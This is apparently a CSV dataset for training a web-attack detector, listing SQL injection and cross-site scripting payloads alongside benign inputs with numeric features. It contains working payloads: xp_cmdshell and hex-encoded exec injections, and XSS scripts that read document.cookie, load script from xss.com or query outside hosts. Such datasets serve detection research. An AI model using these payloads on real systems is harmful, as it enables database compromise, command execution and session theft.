payload,payload_length,payload_type,response_code,response_length,triggered,has_single_quote,has_angle_bracket,has_double_dash,has_equals,special_char_count,payload_type_encoded
declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s),0.36686473311230644,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),0.4426045489806536,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.2516330155050415,0
declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),0.24378753232624234,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,1,-0.1775324956017164,0
 or 1=1 --,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
x' OR full_name LIKE '%Bob%,-0.25798874780155745,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.2886832754567041,0
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,-0.04970425416360281,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.029331455795066172,0
'%20or%20''=',-0.39053342557116494,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.21458275555337897,0
'%20or%20'x'='x,-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.21458275555337897,0
')%20or%20('x'='x,-0.3526635176369914,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.14048223565005385,0
' or 0=0 --,-0.4094683795382517,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,1,-0.32573353540836664,0
' or 0=0 #,-0.4189358565217951,sqli,-0.4397387471509151,0.5664299452882956,1,1,0,0,1,-0.3627837953600292,0
' or '1'='1'--,-0.38106594858762155,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,1,-0.1775324956017164,0
' or 1 --',-0.4189358565217951,sqli,-0.4397387471509151,0.5664299452882956,1,1,0,1,0,-0.32573353540836664,0
' or a=a--,-0.4189358565217951,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,1,-0.32573353540836664,0
') or ('a'='a,-0.39053342557116494,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.21458275555337897,0
'hi' or 'x'='x';,-0.3621309946205348,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.1775324956017164,0
or,-0.49467567239014226,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
procedure,-0.4284033335053385,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
handler,-0.44733828747242527,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
' or username like '%,-0.3147936097028178,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
' or uname like '%,-0.34319604065344794,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
' or userid like '%,-0.33372856366990455,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
' or uid like '%,-0.3621309946205348,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
' or user like '%,-0.3526635176369914,sqli,-0.4397387471509151,0.5881095533652464,1,1,0,0,0,-0.3627837953600292,0
'; exec master..xp_cmdshell,-0.25798874780155745,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.2886832754567041,0
'; exec xp_regread,-0.34319604065344794,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
t'exec master..xp_cmdshell 'nslookup www.google.com'--,-0.002366869245885848,sqli,2.2740775209804465,-2.26244920006697,0,1,0,1,0,-0.1034319756983913,0
--sp_password,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,0,-0.3627837953600292,0
' UNION SELECT,-0.38106594858762155,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.43688431526335436,0
' UNION ALL SELECT,-0.34319604065344794,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.43688431526335436,0
' or (EXISTS),-0.39053342557116494,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.3627837953600292,0
' (select top 1,-0.37159847160407816,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.39983405531169175,0
'||UTL_HTTP.REQUEST,-0.33372856366990455,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.2886832754567041,0
1;SELECT%20*,-0.4000009025547083,sqli,-0.4397387471509151,0.4010455065298424,0,0,0,0,0,-0.3627837953600292,0
"<>""'%;)(&+",-0.4189358565217951,sqli,2.2740775209804465,-2.26244920006697,0,1,1,0,0,-0.1034319756983913,0
'%20or%201=1,-0.4000009025547083,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.32573353540836664,0
'sqlattempt1,-0.4000009025547083,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,0,-0.43688431526335436,0
%28,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
%29,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
%26,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
%21,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.43688431526335436,0
' or ''=',-0.4284033335053385,sqli,-0.4397387471509151,0.5633328584201598,1,1,0,0,1,-0.2886832754567041,0
' or 3=3,-0.4378708104888819,sqli,2.2740775209804465,-2.26244920006697,0,1,0,0,1,-0.39983405531169175,0
 or 3=3 --,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,1,1,-0.32573353540836664,0
%C0%80%27%C0%80%C0%80%C0%80O%C0%82R%C0%80%C0%801%C0%80%C0%A11,0.0639054696389179,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,0.23002036386657174,0
john,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
jane,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
bob,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
alice,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
admin,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
hello,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
world,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
test,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
search,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
query,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
1,-0.5041431493736857,sqli,-0.4397387471509151,0.39423191541994357,0,0,0,0,0,-0.4739345752150169,0
2,-0.5041431493736857,sqli,-0.4397387471509151,0.3948513327935707,0,0,0,0,0,-0.4739345752150169,0
3,-0.5041431493736857,sqli,-0.4397387471509151,0.3917542459254349,0,0,0,0,0,-0.4739345752150169,0
42,-0.49467567239014226,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
100,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
user@email.com,-0.38106594858762155,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
test@test.com,-0.39053342557116494,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
laptop,-0.45680576445596865,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
phone,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
shoes,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
book,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
music,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
password,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
username,-0.4378708104888819,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
login,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
home,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
help,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
2024,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
01/01/2023,-0.4189358565217951,sqli,-0.4397387471509151,0.39980667178258805,0,0,0,0,0,-0.39983405531169175,0
january,-0.44733828747242527,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
www.google.com,-0.38106594858762155,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.39983405531169175,0
http://example.com,-0.34319604065344794,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.32573353540836664,0
hello world,-0.4094683795382517,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
foo,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
bar,-0.4852081954065989,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
input,-0.46627324143951204,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
data,-0.47574071842305543,sqli,-0.4397387471509151,0.3576862903759408,0,0,0,0,0,-0.4739345752150169,0
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E,0.23432005534269895,xss,-0.4397387471509151,0.5137794685299866,0,1,0,1,0,0.19297010391490918,1
<<scr\0ipt/src=http://xss.com/xss.js></script,-0.08757416209777638,xss,-0.4397387471509151,0.4927192778266629,1,0,1,0,1,0.04476906410825895,1
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E,0.29112491724395934,xss,-0.4397387471509151,0.5174959727717495,0,0,0,1,0,0.19297010391490918,1
' onmouseover=alert(/XSS/),-0.26745622478510084,xss,-0.4397387471509151,0.48095034772774675,0,1,0,0,1,-0.2516330155050415,1
"""><iframe%20src=""http://google.com""%%203E",-0.12544407003194993,xss,-0.4397387471509151,0.49024160833215424,1,0,1,0,1,0.007718804156596389,1
'<script>window.onload=function(){document.forms[0].message.value='1';}</script>,0.24378753232624234,xss,-0.4397387471509151,0.5143988859036137,1,1,1,0,1,0.3041208837698969,1
x”</title><img src%3dx onerror%3dalert(1)>,-0.11597659304840656,xss,-0.4397387471509151,0.49086102570578144,1,0,1,0,0,-0.1034319756983913,1
<script> document.getElementById(%22safe123%22).setCapture(); document.getElementById(%22safe123%22).click(); </script>,0.6130191346844347,xss,-0.4397387471509151,0.5385561634750732,1,0,1,0,0,0.378221403673222,1
"<script>Object.defineProperties(window, {Safe: {value: {get: function() {return document.cookie}}}});alert(Safe.get())</script>",0.6887589505527818,xss,-0.4397387471509151,0.5435115024640905,1,0,1,0,0,0.6005229633831974,1
"<script>var x = document.createElement('iframe');document.body.appendChild(x);var xhr = x.contentWindow.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();</script>",2.137282929034921,xss,-0.4397387471509151,0.6382823606290469,1,1,1,0,1,2.0454831014980375,1
"<script>(function() {var event = document.createEvent(%22MouseEvents%22);event.initMouseEvent(%22click%22, true, true, window, 0, 0, 0, 0, 0, false, false, false, false, 0, null);var fakeData = [event, {isTrusted: true}, event];arguments.__defineGetter__('0', function() { return fakeData.pop(); });alert(Safe.get.apply(null, arguments));})();</script>",2.818941271850045,xss,-0.4397387471509151,0.6828804115302027,1,1,1,0,1,2.378935441063,1
<script>var script = document.getElementsByTagName('script')[0]; var clone = script.childNodes[0].cloneNode(true); var ta = document.createElement('textarea'); ta.appendChild(clone); alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,1.7207139417590116,xss,-0.4397387471509151,0.6110279961894516,1,1,1,0,1,1.4156286823197737,1
"<script>xhr=new ActiveXObject(%22Msxml2.XMLHTTP%22);xhr.open(%22GET%22,%22/xssme2%22,true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();</script>",1.7301814187425548,xss,-0.4397387471509151,0.6116474135630787,1,1,1,0,1,1.897282061691387,1
<script>alert(document.documentElement.innerHTML.match(/'([^']%2b)/)[1])</script>,0.25325500930978573,xss,-0.4397387471509151,0.5150183032772409,1,1,1,0,0,0.41527166362488455,1
<script>alert(document.getElementsByTagName('html')[0].innerHTML.match(/'([^']%2b)/)[1])</script>,0.40473464104648,xss,-0.4397387471509151,0.5249289812552755,1,1,1,0,0,0.63757322333486,1
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>,3.0461607194550866,xss,-0.4397387471509151,0.6977464284972548,1,1,1,0,1,4.7131018180177415,1
"<script> var xdr = new ActiveXObject(%22Microsoft.XMLHTTP%22);  xdr.open(%22get%22, %22/xssme2%3Fa=1%22, true); xdr.onreadystatechange = function() { try{   var c;   if (c=xdr.responseText.match(/document.cookie = '(.*%3F)'/) )    alert(c[1]); }catch(e){} };  xdr.send(); </script>",2.146750406018464,xss,-0.4397387471509151,0.638901778002674,1,1,1,0,1,1.9713825815947121,1
"<iframe id=%22ifra%22 src=%22/%22></iframe> <script>ifr = document.getElementById('ifra'); ifr.contentDocument.write(%22<scr%22 %2b %22ipt>top.foo = Object.defineProperty</scr%22 %2b %22ipt>%22); foo(window, 'Safe', {value:{}}); foo(Safe, 'get', {value:function() {    return document.cookie }}); alert(Safe.get());</script>",2.55385191631083,xss,-0.4397387471509151,0.6655367250686421,1,1,1,0,1,2.415985701014663,1
<script>alert(document.head.childNodes[3].text)</script>,0.016568084721200936,xss,-0.4397387471509151,0.49953286893656174,1,0,1,0,0,-0.029331455795066172,1
"<script>var request = new XMLHttpRequest();request.open('GET', 'http://html5sec.org/xssme2', false);request.send(null);if (request.status == 200){alert(request.responseText.substr(150,41));}</script>",1.370417293367906,xss,-0.4397387471509151,0.5881095533652464,1,1,1,0,1,1.1192266027064732,1
"<script>Object.defineProperty(window, 'Safe', {value:{}});Object.defineProperty(Safe, 'get', {value:function() {return document.cookie}});alert(Safe.get())</script>",1.0390555989438872,xss,-0.4397387471509151,0.5664299452882956,1,1,1,0,0,0.971025562899823,1
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%22)};document.body.appendChild(x);</script>",2.8284087488335885,xss,-0.4397387471509151,0.68349982890383,1,1,1,0,1,2.823538560482951,1
"<script>x=document.createElement(%22iframe%22);x.src=%22http://xssme.html5sec.org/404%22;x.onload=function(){window.frames[0].document.write(%22<script>Object.defineProperty(parent,'Safe',{value:{}});Object.defineProperty(parent.Safe,'get',{value:function(){return top.document.cookie}});alert(parent.Safe.get())<\/script>%22)};document.body.appendChild(x);</script>",2.9514859496196526,xss,-0.4397387471509151,0.6915522547609831,1,1,1,0,1,2.7494380405796255,1
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>",2.6485266861462637,xss,-0.4397387471509151,0.6717308988049138,1,1,1,0,1,3.045840120192926,1
"<script> document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click({'type':'click','isTrusted':true}); </script>",1.152665322746408,xss,-0.4397387471509151,0.5738629537718216,1,1,1,0,1,1.1192266027064732,1
<script> var+MouseEvent=function+MouseEvent(){}; MouseEvent=MouseEvent var+test=new+MouseEvent(); test.isTrusted=true; test.type='click';  document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());} document.getElementById(%22safe123%22).click(test); </script>,2.108880498084291,xss,-0.4397387471509151,0.6364241085081653,1,1,1,0,1,1.563829722126424,1
"<script>  (function (o) {   function exploit(x) {    if (x !== null)     alert('User cookie is ' %2B x);    else     console.log('fail');   }      o.onclick = function (e) {    e.__defineGetter__('isTrusted', function () { return true; });    exploit(Safe.get());   };      var e = document.createEvent('MouseEvent');   e.initEvent('click', true, true);   o.dispatchEvent(e);  })(document.getElementById('safe123')); </script>",3.519534568632256,xss,-0.4397387471509151,0.728717297178613,1,1,1,0,1,2.786488300531288,1
"<iframe src=/ onload=eval(unescape(this.name.replace(/\/g,null))) name=fff%253Dnew%2520this.contentWindow.window.XMLHttpRequest%2528%2529%253Bfff.open%2528%2522GET%2522%252C%2522xssme2%2522%2529%253Bfff.onreadystatechange%253Dfunction%2528%2529%257Bif%2520%2528fff.readyState%253D%253D4%2520%2526%2526%2520fff.status%253D%253D200%2529%257Balert%2528fff.responseText%2529%253B%257D%257D%253Bfff.send%2528%2529%253B></iframe>",3.491132137681626,xss,-0.4397387471509151,0.7268590450577316,1,0,1,0,1,2.0454831014980375,1
"<script>     function b() { return Safe.get(); } alert(b({type:String.fromCharCode(99,108,105,99,107),isTrusted:true})); </script>",0.7171613815034119,xss,-0.4397387471509151,0.5453697545849719,1,0,1,0,0,0.63757322333486,1
<img src=http://www.google.fr/images/srpr/logo3w.png onload=alert(this.ownerDocument.cookie) width=0 height= 0 /> #,0.575149226750261,xss,-0.4397387471509151,0.5360784939805645,1,0,1,0,1,0.3041208837698969,1
"<script>  function foo(elem, doc, text) {   elem.onclick = function (e) {    e.__defineGetter__(text[0], function () { return true })    alert(Safe.get());   };      var event = doc.createEvent(text[1]);   event.initEvent(text[2], true, true);   elem.dispatchEvent(event);  } </script> <img src=http://www.google.fr/images/srpr/logo3w.png onload=foo(this,this.ownerDocument,this.name.split(/,/)) name=isTrusted,MouseEvent,click width=0 height=0 /> #",3.737286539253754,xss,-0.4397387471509151,0.7429638967720379,1,0,1,0,1,2.823538560482951,1
<SCRIPT+FOR=document+EVENT=onreadystatechange>MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;getElementById(%22safe123%22).click=function()+{alert(Safe.get());};getElementById(%22safe123%22).click(test);</SCRIPT>#,1.99527077428177,xss,-0.4397387471509151,0.6289911000246393,1,0,1,0,1,1.6008799820780866,1
"<script> var+xmlHttp+=+null; try+{ xmlHttp+=+new+XMLHttpRequest(); }+catch(e)+{} if+(xmlHttp)+{ xmlHttp.open('GET',+'/xssme2',+true); xmlHttp.onreadystatechange+=+function+()+{ if+(xmlHttp.readyState+==+4)+{ xmlHttp.responseText.match(/document.cookie%5Cs%2B=%5Cs%2B'(.*)'/gi); alert(RegExp.%241); } } xmlHttp.send(null); }; </script>#",2.6579941631298074,xss,-0.4397387471509151,0.6723503161785409,1,1,1,0,1,3.0828903801445886,1
<video+onerror='javascript:MouseEvent=function+MouseEvent(){};test=new+MouseEvent();test.isTrusted=true;test.type=%22click%22;document.getElementById(%22safe123%22).click=function()+{alert(Safe.get());};document.getElementById(%22safe123%22).click(test);'><source>%23,2.014205728248857,xss,-0.4397387471509151,0.6302299347718937,1,1,1,0,1,1.6749805019814117,1
<script for=document event=onreadystatechange>getElementById('safe123').click()</script>,0.3195273481945895,xss,-0.4397387471509151,0.5193542248926311,1,1,1,0,1,0.04476906410825895,1
<script> var+x+=+showModelessDialog+(this); alert(x.document.cookie); </script>,0.23432005534269895,xss,-0.4397387471509151,0.5137794685299866,1,0,1,0,1,0.19297010391490918,1
"<script> location.href = 'data:text/html;base64,PHNjcmlwdD54PW5ldyBYTUxIdHRwUmVxdWVzdCgpO3gub3BlbigiR0VUIiwiaHR0cDovL3hzc21lLmh0bWw1c2VjLm9yZy94c3NtZTIvIix0cnVlKTt4Lm9ubG9hZD1mdW5jdGlvbigpIHsgYWxlcnQoeC5yZXNwb25zZVRleHQubWF0Y2goL2RvY3VtZW50LmNvb2tpZSA9ICcoLio/KScvKVsxXSl9O3guc2VuZChudWxsKTs8L3NjcmlwdD4='; </script>",2.478112100442483,xss,-0.4397387471509151,0.6605813860796248,1,1,1,0,1,0.11886958401158407,1
"<iframe src=%22404%22 onload=%22frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1.8721935734957058,xss,-0.4397387471509151,0.6209386741674862,1,1,1,0,1,1.9713825815947121,1
"<iframe src=%22404%22 onload=%22content.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1.947933389364053,xss,-0.4397387471509151,0.6258940131565035,1,1,1,0,1,2.008432841546375,1
"<iframe src=%22404%22 onload=%22self.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1.9195309584134228,xss,-0.4397387471509151,0.6240357610356221,1,1,1,0,1,2.008432841546375,1
"<iframe src=%22404%22 onload=%22top.frames[0].document.write(%26quot;<script>r=new XMLHttpRequest();r.open('GET','http://xssme.html5sec.org/xssme2',false);r.send(null);if(r.status==200){alert(r.responseText.substr(150,41));}<\/script>%26quot;)%22></iframe>",1.9100634814298794,xss,-0.4397387471509151,0.6234163436619948,1,1,1,0,1,2.008432841546375,1
"<script>var x = safe123.onclick;safe123.onclick = function(event) {var f = false;var o = { isTrusted: true };var a = [event, o, event];var get;event.__defineGetter__('type', function() {get = arguments.callee.caller.arguments.callee;return 'click';});var _alert = alert;alert = function() { alert = _alert };x.apply(null, a);(function() {arguments.__defineGetter__('0', function() { return a.pop(); });alert(get());})();};safe123.click();</script>#",3.7278190622702105,xss,-0.4397387471509151,0.7423444793984106,1,1,1,0,1,3.490443239612877,1
"<iframe onload=%22write('<script>'%2Blocation.hash.substr(1)%2B'</script>')%22></iframe>#var xhr = new XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",2.042608159199487,xss,-0.4397387471509151,0.6320881868927752,1,1,1,0,1,2.3048349211596753,1
<textarea id=ta></textarea><script>ta.appendChild(safe123.parentNode.previousSibling.previousSibling.childNodes[3].firstChild.cloneNode(true));alert(ta.value.match(/cookie = '(.*?)'/)[1])</script>,1.3420148624172759,xss,-0.4397387471509151,0.586251301244365,1,1,1,0,1,1.1192266027064732,1
<textarea id=ta onfocus=console.dir(event.currentTarget.ownerDocument.location.href=%26quot;javascript:\%26quot;%26lt;script%26gt;var%2520xhr%2520%253D%2520new%2520XMLHttpRequest()%253Bxhr.open('GET'%252C%2520'http%253A%252F%252Fhtml5sec.org%252Fxssme2'%252C%2520true)%253Bxhr.onload%2520%253D%2520function()%2520%257B%2520alert(xhr.responseText.match(%252Fcookie%2520%253D%2520'(.*%253F)'%252F)%255B1%255D)%2520%257D%253Bxhr.send()%253B%26lt;\/script%26gt;\%26quot;%26quot;) autofocus></textarea>,4.191725434463837,xss,-0.4397387471509151,0.7726959307061418,1,1,1,0,1,3.1199406400962513,1
"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",2.5349169623437433,xss,-0.4397387471509151,0.6642978903213878,1,1,1,0,1,2.415985701014663,1
<textarea id=ta onfocus=%22write('<script>alert(1)</script>')%22 autofocus></textarea>,0.3005923942275027,xss,-0.4397387471509151,0.5181153901453767,1,1,1,0,1,0.2670706238182343,1
"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>",2.459177146475396,xss,-0.4397387471509151,0.6593425513323705,1,0,1,0,1,-0.1034319756983913,1
"<script>function x(window) { eval(location.hash.substr(1)) }; open(%22javascript:opener.x(window)%22)</script>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",2.317164991722245,xss,-0.4397387471509151,0.650051290727963,1,1,1,0,1,2.3048349211596753,1
"%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E",2.165685359985551,xss,-0.4397387471509151,0.6401406127499284,0,0,0,0,1,1.9343323216430497,1
"<iframe src=`http://xssme.html5sec.org/?xss=<iframe onload=%22xhr=new XMLHttpRequest();xhr.open('GET','http://html5sec.org/xssme2',true);xhr.onreadystatechange=function(){if(xhr.readyState==4%26%26xhr.status==200){alert(xhr.responseText.match(/'([^']%2b)/)[1])}};xhr.send();%22>`>",2.137282929034921,xss,-0.4397387471509151,0.6382823606290469,1,1,1,0,1,2.415985701014663,1
